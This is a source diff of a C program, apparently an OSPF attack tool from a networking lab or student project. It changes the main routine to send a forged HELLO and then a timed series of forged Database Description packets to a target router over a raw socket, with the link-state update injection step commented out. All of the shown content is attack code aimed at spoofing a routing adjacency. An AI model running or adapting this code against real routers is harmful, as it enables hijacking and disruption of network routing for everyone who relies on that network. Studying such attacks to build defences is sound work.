@@ -8,6 +8,7 @@
 #include <string.h>
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <unistd.h>
 #include <linux/if_ether.h>
 #include <netpacket/packet.h>
 #include <net/ethernet.h>
@@ -15,6 +16,7 @@
 #include <arpa/inet.h>
 
 #include "utils.h"
+#include "ospf.h"
 #include "ospf_attack.h"
 
 unsigned char *parse_ip_addr(char *ip_str);
@@ -59,20 +61,52 @@ int main(int argc, char *argv[]) {
     exit(1);
   }
   printf("Send HELLO success (%d).\n", ret_value);
+  sleep(3);
 
-  packet_len = attack_write_db_description(buffer, local_mac, local_ip, router_ip);
+  /* primeiro 0x07 = master coisas para enviar e comançando, segundo 0x03 = master e tem coisas para enviar, terceiro 0x01 eu sou o master */
+
+  unsigned long dd_seq_number = 10000;
+
+  // 0x07
+  packet_len = attack_write_db_description(buffer, local_mac, local_ip, router_ip, dd_seq_number, DDC_INIT + DDC_MORE + DDC_MSTR);
   if((ret_value = sendto(sock_fd, buffer, packet_len, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
     printf("ERROR! sendto() \n");
     exit(1);
   }
   printf("Send DB Description success (%d).\n", ret_value);
+  dd_seq_number += 1;
+  sleep(4);
 
-  packet_len = attack_write_ls_update(buffer, local_mac, local_ip, router_ip);
+  int i = 0;
+  while (i < 4) {
+    i++;
+    // 0x03
+    packet_len = attack_write_db_description(buffer, local_mac, local_ip, router_ip, dd_seq_number, DDC_MSTR + DDC_MORE);
+    if((ret_value = sendto(sock_fd, buffer, packet_len, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
+      printf("ERROR! sendto() \n");
+      exit(1);
+    }
+    printf("Send DB Description success (%d).\n", ret_value);
+    sleep(3);
+    dd_seq_number += 1;
+  }
+  // 0x01
+  packet_len = attack_write_db_description(buffer, local_mac, local_ip, router_ip, dd_seq_number, DDC_MSTR);
   if((ret_value = sendto(sock_fd, buffer, packet_len, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
     printf("ERROR! sendto() \n");
     exit(1);
   }
-  printf("Send LS Update success (%d).\n", ret_value);
+  printf("Send DB Description success (%d).\n", ret_value);
+  dd_seq_number += 1;
+
+  // sleep(2);
+
+  // packet_len = attack_write_ls_update(buffer, local_mac, local_ip, router_ip);
+  // if((ret_value = sendto(sock_fd, buffer, packet_len, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
+  //   printf("ERROR! sendto() \n");
+  //   exit(1);
+  // }
+  // printf("Send LS Update success (%d).\n", ret_value);
 
   return 0;
 }
